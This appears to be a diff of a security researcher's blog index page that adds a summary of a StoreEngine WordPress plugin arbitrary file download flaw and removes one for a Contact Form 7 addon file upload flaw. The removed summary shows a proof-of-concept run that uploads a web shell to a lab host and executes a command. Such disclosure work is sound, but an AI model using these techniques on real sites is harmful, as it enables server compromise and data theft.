@@ -72,7 +72,7 @@
 <meta property="og:url" content="https://ryankozak.com/" />
 
 
-<meta property="og:updated_time" content="2025-12-02T00:02:00Z" />
+<meta property="og:updated_time" content="2025-12-04T00:02:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />
@@ -273,6 +273,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -293,6 +295,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13390/">WP Directory Kit &lt;= 1.4.4 - Authentication Bypass to Privilege Escalation via Account Takeover</a>
                             </li>
                         
@@ -308,10 +314,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-13595/">CIBELES AI &lt;= 1.10.8 - Unauthenticated Arbitrary File Upload</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-13380/">AI Engine for WordPress: ChatGPT, GPT Content Generator &lt;= 1.0.1 - Authenticated (Contributor&#43;) Arbitrary File Read</a>
-                            </li>
-                        
                     
                 
             
@@ -320,6 +322,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -419,6 +423,65 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-9215/">StoreEngine Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales &amp; More &lt;= 1.4.0 - Authenticated (Subscriber&#43;) Arbitrary File Download</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-09-16T00:00:00Z" class="post-date">
+        September 16, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>4 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-StoreEngine">
+        <a href="https://ryankozak.com/tags/storeengine">StoreEngine</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-9215">CVE-2025-9215</h3>
+<p>The <a href="https://wordpress.org/plugins/storeengine/" target="_blank">StoreEngine</a> plugin contains a vulnerability in its CSV Import/Export feature that allows <strong>any authenticated user</strong> (subscriber, author, editor, etc.) to download arbitrary files from the server, including sensitive system files, WordPress configuration files, and plugin source code. The vulnerability stems from the <code>storeengine_csv/file_download</code> endpoint lacking proper path sanitization and only relying on nonce verification for security, while the <code>storeengine_nonce</code> is exposed to <strong>ALL frontend users</strong> through the plugin&rsquo;s JavaScript. <strong>Note: This vulnerability requires the CSV Import/Export addon to be enabled by an administrator.</strong> Once enabled, this combination allows any authenticated user to extract the nonce from frontend pages and use it to download any file on the server via path traversal attacks, effectively granting subscriber+ users access to sensitive system and application files.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-9215/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -755,104 +818,6 @@ state DOWN group default
         
         <div class="read-more-link">
             <a href="/posts/cve-2025-5961/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2025-6220/">Ultimate Addons for Contact Form 7 &lt;= 3.5.12 - Authenticated (Administrator&#43;) Arbitrary File Upload via save_options</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2025-06-17T00:00:12Z" class="post-date">
-        June 17, 2025
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>2 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <h3 id="cve-2025-6220">CVE-2025-6220</h3>
-<p>The <a href="https://wordpress.org/plugins/ultimate-addons-for-contact-form-7/" target="_blank">Ultimate Addons for Contact Form 7</a> plugin does not sanitize the file types in its options save functionality, allowing administrators or above to upload arbitrary files and potentially gain code execution on the server.</p>
-<h2 id="tldr-exploits">TL;DR Exploits</h2>
-<ul>
-<li>A POC <a href="https://github.com/d0n601/CVE-2025-6220/blob/master/CVE-2025-6220.py" target="_blank">CVE-2025-6220.py</a> is provided to demonstrate an administrator uploading a web shell named <code>shell.php</code>.</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>python3 CVE-2025-6220.py https://lab1.hacker admin PASSWORD
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Logging into: https://lab1.hacker/wp-admin
-</span></span><span style="display:flex;"><span>Extracting nonce values...
-</span></span><span style="display:flex;"><span>70e7b99966
-</span></span><span style="display:flex;"><span>Uploading web shell: shell.php
-</span></span><span style="display:flex;"><span>{&#34;status&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Options saved successfully!&#34;}
-</span></span><span style="display:flex;"><span>Web Shell Location: https://lab1.hacker/wp-content/uploads/itinerary-fonts/shell.php
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Executing test command: ip addr
-</span></span><span style="display:flex;"><span>&lt;pre&gt;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host 
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
-</span></span><span style="display:flex;"><span>    link/ether 08:00:27:5b:34:2f brd ff:ff:ff:ff:ff:ff
-</span></span><span style="display:flex;"><span>    altname enp0s3
-</span></span><span style="display:flex;"><span>    inet 10.0.2.15/24 metric 100 brd 10.0.2.255 scope global dynamic eth0
-</span></span><span style="display:flex;"><span>       valid_lft 61299sec preferred_lft 61299sec
-</span></span><span style="display:flex;"><span>    inet6 fd17:625c:f037:2:a00:27ff:fe5b:342f/64 scope global dynamic mngtmpaddr noprefixroute 
-</span></span><span style="display:flex;"><span>       valid_lft 86240sec preferred_lft 14240sec
-</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe5b:342f/64 scope link 
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
-</span></span><span style="display:flex;"><span>    link/ether 08:00:27:39:ea:eb brd ff:ff:ff:ff:ff:ff
-</span></span><span style="display:flex;"><span>    altname enp0s8
-</span></span><span style="display:flex;"><span>    inet 192.168.56.56/24 brd 192.168.56.255 scope global eth1
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe39:eaeb/64 scope link 
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
-</span></span><span style="display:flex;"><span>    link/ether 02:42:bd:e1:95:26 brd ff:ff:ff:ff:ff:ff
-</span></span><span style="display:flex;"><span>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>&lt;/pre&gt;
-</span></span></code></pre></div><h2 id="details">Details</h2>
-<p>The <code>uacf7_options_save</code> functionality in <code>/wp-content/plugins/ultimate-addons-for-contact-form-7/admin/tf-options/classes/UACF7_Settings.php</code> processes file uploads without enforcing proper file type validation.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2025-6220/">Read More…</a>
         </div>
         
         
